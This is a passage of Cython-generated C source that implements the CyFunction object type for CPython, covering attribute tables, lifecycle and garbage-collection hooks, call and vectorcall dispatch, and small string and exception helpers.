    {(char *) "func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},
    {(char *) "func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},
    {(char *) "__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},
    {(char *) "_is_coroutine", (getter)__Pyx_CyFunction_get_is_coroutine, 0, 0, 0},
#if CYTHON_COMPILING_IN_LIMITED_API
    {"__module__", (getter)__Pyx_CyFunction_get_module, (setter)__Pyx_CyFunction_set_module, 0, 0},
#endif
    {0, 0, 0, 0, 0}
};
static PyMemberDef __pyx_CyFunction_members[] = {
#if !CYTHON_COMPILING_IN_LIMITED_API
    {(char *) "__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), 0, 0},
#endif
#if CYTHON_USE_TYPE_SPECS
    {(char *) "__dictoffset__", T_PYSSIZET, offsetof(__pyx_CyFunctionObject, func_dict), READONLY, 0},
#if CYTHON_METH_FASTCALL
#if CYTHON_BACKPORT_VECTORCALL
    {(char *) "__vectorcalloffset__", T_PYSSIZET, offsetof(__pyx_CyFunctionObject, func_vectorcall), READONLY, 0},
#else
#if !CYTHON_COMPILING_IN_LIMITED_API
    {(char *) "__vectorcalloffset__", T_PYSSIZET, offsetof(PyCFunctionObject, vectorcall), READONLY, 0},
#endif
#endif
#endif
#if PY_VERSION_HEX < 0x030500A0 || CYTHON_COMPILING_IN_LIMITED_API
    {(char *) "__weaklistoffset__", T_PYSSIZET, offsetof(__pyx_CyFunctionObject, func_weakreflist), READONLY, 0},
#else
    {(char *) "__weaklistoffset__", T_PYSSIZET, offsetof(PyCFunctionObject, m_weakreflist), READONLY, 0},
#endif
#endif
    {0, 0, 0,  0, 0}
};
static PyObject *
__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, PyObject *args)
{
    CYTHON_UNUSED_VAR(args);
#if PY_MAJOR_VERSION >= 3
    Py_INCREF(m->func_qualname);
    return m->func_qualname;
#else
    return PyString_FromString(((PyCFunctionObject*)m)->m_ml->ml_name);
#endif
}
static PyMethodDef __pyx_CyFunction_methods[] = {
    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},
    {0, 0, 0, 0}
};
#if PY_VERSION_HEX < 0x030500A0 || CYTHON_COMPILING_IN_LIMITED_API
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)
#else
#define __Pyx_CyFunction_weakreflist(cyfunc) (((PyCFunctionObject*)cyfunc)->m_weakreflist)
#endif
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,
                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
#if !CYTHON_COMPILING_IN_LIMITED_API
    PyCFunctionObject *cf = (PyCFunctionObject*) op;
#endif
    if (unlikely(op == NULL))
        return NULL;
#if CYTHON_COMPILING_IN_LIMITED_API
    op->func = PyCFunction_NewEx(ml, (PyObject*)op, module);
    if (unlikely(!op->func)) return NULL;
#endif
    op->flags = flags;
    __Pyx_CyFunction_weakreflist(op) = NULL;
#if !CYTHON_COMPILING_IN_LIMITED_API
    cf->m_ml = ml;
    cf->m_self = (PyObject *) op;
#endif
    Py_XINCREF(closure);
    op->func_closure = closure;
#if !CYTHON_COMPILING_IN_LIMITED_API
    Py_XINCREF(module);
    cf->m_module = module;
#endif
    op->func_dict = NULL;
    op->func_name = NULL;
    Py_INCREF(qualname);
    op->func_qualname = qualname;
    op->func_doc = NULL;
#if PY_VERSION_HEX < 0x030900B1 || CYTHON_COMPILING_IN_LIMITED_API
    op->func_classobj = NULL;
#else
    ((PyCMethodObject*)op)->mm_class = NULL;
#endif
    op->func_globals = globals;
    Py_INCREF(op->func_globals);
    Py_XINCREF(code);
    op->func_code = code;
    op->defaults_pyobjects = 0;
    op->defaults_size = 0;
    op->defaults = NULL;
    op->defaults_tuple = NULL;
    op->defaults_kwdict = NULL;
    op->defaults_getter = NULL;
    op->func_annotations = NULL;
    op->func_is_coroutine = NULL;
#if CYTHON_METH_FASTCALL
    switch (ml->ml_flags & (METH_VARARGS | METH_FASTCALL | METH_NOARGS | METH_O | METH_KEYWORDS | METH_METHOD)) {
    case METH_NOARGS:
        __Pyx_CyFunction_func_vectorcall(op) = __Pyx_CyFunction_Vectorcall_NOARGS;
        break;
    case METH_O:
        __Pyx_CyFunction_func_vectorcall(op) = __Pyx_CyFunction_Vectorcall_O;
        break;
    case METH_METHOD | METH_FASTCALL | METH_KEYWORDS:
        __Pyx_CyFunction_func_vectorcall(op) = __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS_METHOD;
        break;
    case METH_FASTCALL | METH_KEYWORDS:
        __Pyx_CyFunction_func_vectorcall(op) = __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS;
        break;
    case METH_VARARGS | METH_KEYWORDS:
        __Pyx_CyFunction_func_vectorcall(op) = NULL;
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags for CyFunction");
        Py_DECREF(op);
        return NULL;
    }
#endif
    return (PyObject *) op;
}
static int
__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)
{
    Py_CLEAR(m->func_closure);
#if CYTHON_COMPILING_IN_LIMITED_API
    Py_CLEAR(m->func);
#else
    Py_CLEAR(((PyCFunctionObject*)m)->m_module);
#endif
    Py_CLEAR(m->func_dict);
    Py_CLEAR(m->func_name);
    Py_CLEAR(m->func_qualname);
    Py_CLEAR(m->func_doc);
    Py_CLEAR(m->func_globals);
    Py_CLEAR(m->func_code);
#if !CYTHON_COMPILING_IN_LIMITED_API
#if PY_VERSION_HEX < 0x030900B1
    Py_CLEAR(__Pyx_CyFunction_GetClassObj(m));
#else
    {
        PyObject *cls = (PyObject*) ((PyCMethodObject *) (m))->mm_class;
        ((PyCMethodObject *) (m))->mm_class = NULL;
        Py_XDECREF(cls);
    }
#endif
#endif
    Py_CLEAR(m->defaults_tuple);
    Py_CLEAR(m->defaults_kwdict);
    Py_CLEAR(m->func_annotations);
    Py_CLEAR(m->func_is_coroutine);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_XDECREF(pydefaults[i]);
        PyObject_Free(m->defaults);
        m->defaults = NULL;
    }
    return 0;
}
static void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    if (__Pyx_CyFunction_weakreflist(m) != NULL)
        PyObject_ClearWeakRefs((PyObject *) m);
    __Pyx_CyFunction_clear(m);
    __Pyx_PyHeapTypeObject_GC_Del(m);
}
static void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    PyObject_GC_UnTrack(m);
    __Pyx__CyFunction_dealloc(m);
}
static int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)
{
    Py_VISIT(m->func_closure);
#if CYTHON_COMPILING_IN_LIMITED_API
    Py_VISIT(m->func);
#else
    Py_VISIT(((PyCFunctionObject*)m)->m_module);
#endif
    Py_VISIT(m->func_dict);
    Py_VISIT(m->func_name);
    Py_VISIT(m->func_qualname);
    Py_VISIT(m->func_doc);
    Py_VISIT(m->func_globals);
    Py_VISIT(m->func_code);
#if !CYTHON_COMPILING_IN_LIMITED_API
    Py_VISIT(__Pyx_CyFunction_GetClassObj(m));
#endif
    Py_VISIT(m->defaults_tuple);
    Py_VISIT(m->defaults_kwdict);
    Py_VISIT(m->func_is_coroutine);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_VISIT(pydefaults[i]);
    }
    return 0;
}
static PyObject*
__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)
{
#if PY_MAJOR_VERSION >= 3
    return PyUnicode_FromFormat("<cyfunction %U at %p>",
                                op->func_qualname, (void *)op);
#else
    return PyString_FromFormat("<cyfunction %s at %p>",
                               PyString_AsString(op->func_qualname), (void *)op);
#endif
}
static PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {
#if CYTHON_COMPILING_IN_LIMITED_API
    PyObject *f = ((__pyx_CyFunctionObject*)func)->func;
    PyObject *py_name = NULL;
    PyCFunction meth;
    int flags;
    meth = PyCFunction_GetFunction(f);
    if (unlikely(!meth)) return NULL;
    flags = PyCFunction_GetFlags(f);
    if (unlikely(flags < 0)) return NULL;
#else
    PyCFunctionObject* f = (PyCFunctionObject*)func;
    PyCFunction meth = f->m_ml->ml_meth;
    int flags = f->m_ml->ml_flags;
#endif
    Py_ssize_t size;
    switch (flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {
    case METH_VARARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0))
            return (*meth)(self, arg);
        break;
    case METH_VARARGS | METH_KEYWORDS:
        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);
    case METH_NOARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
#if CYTHON_ASSUME_SAFE_MACROS
            size = PyTuple_GET_SIZE(arg);
#else
            size = PyTuple_Size(arg);
            if (unlikely(size < 0)) return NULL;
#endif
            if (likely(size == 0))
                return (*meth)(self, NULL);
#if CYTHON_COMPILING_IN_LIMITED_API
            py_name = __Pyx_CyFunction_get_name((__pyx_CyFunctionObject*)func, NULL);
            if (!py_name) return NULL;
            PyErr_Format(PyExc_TypeError,
                "%.200S() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                py_name, size);
            Py_DECREF(py_name);
#else
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
#endif
            return NULL;
        }
        break;
    case METH_O:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
#if CYTHON_ASSUME_SAFE_MACROS
            size = PyTuple_GET_SIZE(arg);
#else
            size = PyTuple_Size(arg);
            if (unlikely(size < 0)) return NULL;
#endif
            if (likely(size == 1)) {
                PyObject *result, *arg0;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                arg0 = PyTuple_GET_ITEM(arg, 0);
                #else
                arg0 = __Pyx_PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;
                #endif
                result = (*meth)(self, arg0);
                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
                Py_DECREF(arg0);
                #endif
                return result;
            }
#if CYTHON_COMPILING_IN_LIMITED_API
            py_name = __Pyx_CyFunction_get_name((__pyx_CyFunctionObject*)func, NULL);
            if (!py_name) return NULL;
            PyErr_Format(PyExc_TypeError,
                "%.200S() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                py_name, size);
            Py_DECREF(py_name);
#else
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
#endif
            return NULL;
        }
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags for CyFunction");
        return NULL;
    }
#if CYTHON_COMPILING_IN_LIMITED_API
    py_name = __Pyx_CyFunction_get_name((__pyx_CyFunctionObject*)func, NULL);
    if (!py_name) return NULL;
    PyErr_Format(PyExc_TypeError, "%.200S() takes no keyword arguments",
                 py_name);
    Py_DECREF(py_name);
#else
    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",
                 f->m_ml->ml_name);
#endif
    return NULL;
}
static CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *self, *result;
#if CYTHON_COMPILING_IN_LIMITED_API
    self = PyCFunction_GetSelf(((__pyx_CyFunctionObject*)func)->func);
    if (unlikely(!self) && PyErr_Occurred()) return NULL;
#else
    self = ((PyCFunctionObject*)func)->m_self;
#endif
    result = __Pyx_CyFunction_CallMethod(func, self, arg, kw);
    return result;
}
static PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {
    PyObject *result;
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;
#if CYTHON_METH_FASTCALL
     __pyx_vectorcallfunc vc = __Pyx_CyFunction_func_vectorcall(cyfunc);
    if (vc) {
#if CYTHON_ASSUME_SAFE_MACROS
        return __Pyx_PyVectorcall_FastCallDict(func, vc, &PyTuple_GET_ITEM(args, 0), (size_t)PyTuple_GET_SIZE(args), kw);
#else
        (void) &__Pyx_PyVectorcall_FastCallDict;
        return PyVectorcall_Call(func, args, kw);
#endif
    }
#endif
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        Py_ssize_t argc;
        PyObject *new_args;
        PyObject *self;
#if CYTHON_ASSUME_SAFE_MACROS
        argc = PyTuple_GET_SIZE(args);
#else
        argc = PyTuple_Size(args);
        if (unlikely(!argc) < 0) return NULL;
#endif
        new_args = PyTuple_GetSlice(args, 1, argc);
        if (unlikely(!new_args))
            return NULL;
        self = PyTuple_GetItem(args, 0);
        if (unlikely(!self)) {
            Py_DECREF(new_args);
#if PY_MAJOR_VERSION > 2
            PyErr_Format(PyExc_TypeError,
                         "unbound method %.200S() needs an argument",
                         cyfunc->func_qualname);
#else
            PyErr_SetString(PyExc_TypeError,
                            "unbound method needs an argument");
#endif
            return NULL;
        }
        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);
        Py_DECREF(new_args);
    } else {
        result = __Pyx_CyFunction_Call(func, args, kw);
    }
    return result;
}
#if CYTHON_METH_FASTCALL
static CYTHON_INLINE int __Pyx_CyFunction_Vectorcall_CheckArgs(__pyx_CyFunctionObject *cyfunc, Py_ssize_t nargs, PyObject *kwnames)
{
    int ret = 0;
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        if (unlikely(nargs < 1)) {
            PyErr_Format(PyExc_TypeError, "%.200s() needs an argument",
                         ((PyCFunctionObject*)cyfunc)->m_ml->ml_name);
            return -1;
        }
        ret = 1;
    }
    if (unlikely(kwnames) && unlikely(PyTuple_GET_SIZE(kwnames))) {
        PyErr_Format(PyExc_TypeError,
                     "%.200s() takes no keyword arguments", ((PyCFunctionObject*)cyfunc)->m_ml->ml_name);
        return -1;
    }
    return ret;
}
static PyObject * __Pyx_CyFunction_Vectorcall_NOARGS(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames)
{
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *)func;
    PyMethodDef* def = ((PyCFunctionObject*)cyfunc)->m_ml;
#if CYTHON_BACKPORT_VECTORCALL
    Py_ssize_t nargs = (Py_ssize_t)nargsf;
#else
    Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);
#endif
    PyObject *self;
    switch (__Pyx_CyFunction_Vectorcall_CheckArgs(cyfunc, nargs, kwnames)) {
    case 1:
        self = args[0];
        args += 1;
        nargs -= 1;
        break;
    case 0:
        self = ((PyCFunctionObject*)cyfunc)->m_self;
        break;
    default:
        return NULL;
    }
    if (unlikely(nargs != 0)) {
        PyErr_Format(PyExc_TypeError,
            "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
            def->ml_name, nargs);
        return NULL;
    }
    return def->ml_meth(self, NULL);
}
static PyObject * __Pyx_CyFunction_Vectorcall_O(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames)
{
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *)func;
    PyMethodDef* def = ((PyCFunctionObject*)cyfunc)->m_ml;
#if CYTHON_BACKPORT_VECTORCALL
    Py_ssize_t nargs = (Py_ssize_t)nargsf;
#else
    Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);
#endif
    PyObject *self;
    switch (__Pyx_CyFunction_Vectorcall_CheckArgs(cyfunc, nargs, kwnames)) {
    case 1:
        self = args[0];
        args += 1;
        nargs -= 1;
        break;
    case 0:
        self = ((PyCFunctionObject*)cyfunc)->m_self;
        break;
    default:
        return NULL;
    }
    if (unlikely(nargs != 1)) {
        PyErr_Format(PyExc_TypeError,
            "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
            def->ml_name, nargs);
        return NULL;
    }
    return def->ml_meth(self, args[0]);
}
static PyObject * __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames)
{
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *)func;
    PyMethodDef* def = ((PyCFunctionObject*)cyfunc)->m_ml;
#if CYTHON_BACKPORT_VECTORCALL
    Py_ssize_t nargs = (Py_ssize_t)nargsf;
#else
    Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);
#endif
    PyObject *self;
    switch (__Pyx_CyFunction_Vectorcall_CheckArgs(cyfunc, nargs, NULL)) {
    case 1:
        self = args[0];
        args += 1;
        nargs -= 1;
        break;
    case 0:
        self = ((PyCFunctionObject*)cyfunc)->m_self;
        break;
    default:
        return NULL;
    }
    return ((__Pyx_PyCFunctionFastWithKeywords)(void(*)(void))def->ml_meth)(self, args, nargs, kwnames);
}
static PyObject * __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS_METHOD(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames)
{
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *)func;
    PyMethodDef* def = ((PyCFunctionObject*)cyfunc)->m_ml;
    PyTypeObject *cls = (PyTypeObject *) __Pyx_CyFunction_GetClassObj(cyfunc);
#if CYTHON_BACKPORT_VECTORCALL
    Py_ssize_t nargs = (Py_ssize_t)nargsf;
#else
    Py_ssize_t nargs = PyVectorcall_NARGS(nargsf);
#endif
    PyObject *self;
    switch (__Pyx_CyFunction_Vectorcall_CheckArgs(cyfunc, nargs, NULL)) {
    case 1:
        self = args[0];
        args += 1;
        nargs -= 1;
        break;
    case 0:
        self = ((PyCFunctionObject*)cyfunc)->m_self;
        break;
    default:
        return NULL;
    }
    return ((__Pyx_PyCMethod)(void(*)(void))def->ml_meth)(self, cls, args, (size_t)nargs, kwnames);
}
#endif
#if CYTHON_USE_TYPE_SPECS
static PyType_Slot __pyx_CyFunctionType_slots[] = {
    {Py_tp_dealloc, (void *)__Pyx_CyFunction_dealloc},
    {Py_tp_repr, (void *)__Pyx_CyFunction_repr},
    {Py_tp_call, (void *)__Pyx_CyFunction_CallAsMethod},
    {Py_tp_traverse, (void *)__Pyx_CyFunction_traverse},
    {Py_tp_clear, (void *)__Pyx_CyFunction_clear},
    {Py_tp_methods, (void *)__pyx_CyFunction_methods},
    {Py_tp_members, (void *)__pyx_CyFunction_members},
    {Py_tp_getset, (void *)__pyx_CyFunction_getsets},
    {Py_tp_descr_get, (void *)__Pyx_PyMethod_New},
    {0, 0},
};
static PyType_Spec __pyx_CyFunctionType_spec = {
    __PYX_TYPE_MODULE_PREFIX "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
#ifdef Py_TPFLAGS_METHOD_DESCRIPTOR
    Py_TPFLAGS_METHOD_DESCRIPTOR |
#endif
#if (defined(_Py_TPFLAGS_HAVE_VECTORCALL) && CYTHON_METH_FASTCALL)
    _Py_TPFLAGS_HAVE_VECTORCALL |
#endif
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_BASETYPE,
    __pyx_CyFunctionType_slots
};
#else
static PyTypeObject __pyx_CyFunctionType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    __PYX_TYPE_MODULE_PREFIX "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
    (destructor) __Pyx_CyFunction_dealloc,
#if !CYTHON_METH_FASTCALL
    0,
#elif CYTHON_BACKPORT_VECTORCALL
    (printfunc)offsetof(__pyx_CyFunctionObject, func_vectorcall),
#else
    offsetof(PyCFunctionObject, vectorcall),
#endif
    0,
    0,
#if PY_MAJOR_VERSION < 3
    0,
#else
    0,
#endif
    (reprfunc) __Pyx_CyFunction_repr,
    0,
    0,
    0,
    0,
    __Pyx_CyFunction_CallAsMethod,
    0,
    0,
    0,
    0,
#ifdef Py_TPFLAGS_METHOD_DESCRIPTOR
    Py_TPFLAGS_METHOD_DESCRIPTOR |
#endif
#if defined(_Py_TPFLAGS_HAVE_VECTORCALL) && CYTHON_METH_FASTCALL
    _Py_TPFLAGS_HAVE_VECTORCALL |
#endif
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC | Py_TPFLAGS_BASETYPE,
    0,
    (traverseproc) __Pyx_CyFunction_traverse,
    (inquiry) __Pyx_CyFunction_clear,
    0,
#if PY_VERSION_HEX < 0x030500A0
    offsetof(__pyx_CyFunctionObject, func_weakreflist),
#else
    offsetof(PyCFunctionObject, m_weakreflist),
#endif
    0,
    0,
    __pyx_CyFunction_methods,
    __pyx_CyFunction_members,
    __pyx_CyFunction_getsets,
    0,
    0,
    __Pyx_PyMethod_New,
    0,
    offsetof(__pyx_CyFunctionObject, func_dict),
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if __PYX_NEED_TP_PRINT_SLOT
    0,
#endif
#if PY_VERSION_HEX >= 0x030C0000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000
    0,
#endif
};
#endif
static int __pyx_CyFunction_init(PyObject *module) {
#if CYTHON_USE_TYPE_SPECS
    __pyx_CyFunctionType = __Pyx_FetchCommonTypeFromSpec(module, &__pyx_CyFunctionType_spec, NULL);
#else
    CYTHON_UNUSED_VAR(module);
    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);
#endif
    if (unlikely(__pyx_CyFunctionType == NULL)) {
        return -1;
    }
    return 0;
}
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults = PyObject_Malloc(size);
    if (unlikely(!m->defaults))
        return PyErr_NoMemory();
    memset(m->defaults, 0, size);
    m->defaults_pyobjects = pyobjects;
    m->defaults_size = size;
    return m->defaults;
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_tuple = tuple;
    Py_INCREF(tuple);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_kwdict = dict;
    Py_INCREF(dict);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->func_annotations = dict;
    Py_INCREF(dict);
}

/* CythonFunction */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,
                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    PyObject *op = __Pyx_CyFunction_Init(
        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),
        ml, flags, qualname, closure, module, globals, code
    );
    if (likely(op)) {
        PyObject_GC_Track(op);
    }
    return op;
}

/* UnicodeConcatInPlace */
# if CYTHON_COMPILING_IN_CPYTHON && PY_MAJOR_VERSION >= 3
static int
__Pyx_unicode_modifiable(PyObject *unicode)
{
    if (Py_REFCNT(unicode) != 1)
        return 0;
    if (!PyUnicode_CheckExact(unicode))
        return 0;
    if (PyUnicode_CHECK_INTERNED(unicode))
        return 0;
    return 1;
}
static CYTHON_INLINE PyObject *__Pyx_PyUnicode_ConcatInPlaceImpl(PyObject **p_left, PyObject *right
        #if CYTHON_REFNANNY
        , void* __pyx_refnanny
        #endif
    ) {
    PyObject *left = *p_left;
    Py_ssize_t left_len, right_len, new_len;
    if (unlikely(__Pyx_PyUnicode_READY(left) == -1))
        return NULL;
    if (unlikely(__Pyx_PyUnicode_READY(right) == -1))
        return NULL;
    left_len = PyUnicode_GET_LENGTH(left);
    if (left_len == 0) {
        Py_INCREF(right);
        return right;
    }
    right_len = PyUnicode_GET_LENGTH(right);
    if (right_len == 0) {
        Py_INCREF(left);
        return left;
    }
    if (unlikely(left_len > PY_SSIZE_T_MAX - right_len)) {
        PyErr_SetString(PyExc_OverflowError,
                        "strings are too large to concat");
        return NULL;
    }
    new_len = left_len + right_len;
    if (__Pyx_unicode_modifiable(left)
            && PyUnicode_CheckExact(right)
            && PyUnicode_KIND(right) <= PyUnicode_KIND(left)
            && !(PyUnicode_IS_ASCII(left) && !PyUnicode_IS_ASCII(right))) {
        int ret;
        __Pyx_GIVEREF(*p_left);
        ret = PyUnicode_Resize(p_left, new_len);
        __Pyx_GOTREF(*p_left);
        if (unlikely(ret != 0))
            return NULL;
        #if PY_VERSION_HEX >= 0x030d0000
        if (unlikely(PyUnicode_CopyCharacters(*p_left, left_len, right, 0, right_len) < 0)) return NULL;
        #else
        _PyUnicode_FastCopyCharacters(*p_left, left_len, right, 0, right_len);
        #endif
        __Pyx_INCREF(*p_left);
        __Pyx_GIVEREF(*p_left);
        return *p_left;
    } else {
        return __Pyx_PyUnicode_Concat(left, right);
    }
  }
#endif

/* PyObjectSetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_setattro))
        return tp->tp_setattro(obj, attr_name, value);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_setattr))
        return tp->tp_setattr(obj, PyString_AS_STRING(attr_name), value);
#endif
    return PyObject_SetAttr(obj, attr_name, value);
}
#endif

/* SwapException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
  #if CYTHON_USE_EXC_INFO_STACK && PY_VERSION_HEX >= 0x030B00a4
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_value = exc_info->exc_value;
    exc_info->exc_value = *value;
    if (tmp_value == NULL || tmp_value == Py_None) {
        Py_XDECREF(tmp_value);
        tmp_value = NULL;
        tmp_type = NULL;
        tmp_tb = NULL;
    } else {
        tmp_type = (PyObject*) Py_TYPE(tmp_value);
        Py_INCREF(tmp_type);
        #if CYTHON_COMPILING_IN_CPYTHON
        tmp_tb = ((PyBaseExceptionObject*) tmp_value)->traceback;
        Py_XINCREF(tmp_tb);
        #else
        tmp_tb = PyException_GetTraceback(tmp_value);
        #endif
    }
  #elif CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = *type;
    exc_info->exc_value = *value;
    exc_info->exc_traceback = *tb;
  #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = *type;
    tstate->exc_value = *value;
    tstate->exc_traceback = *tb;
  #endif
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
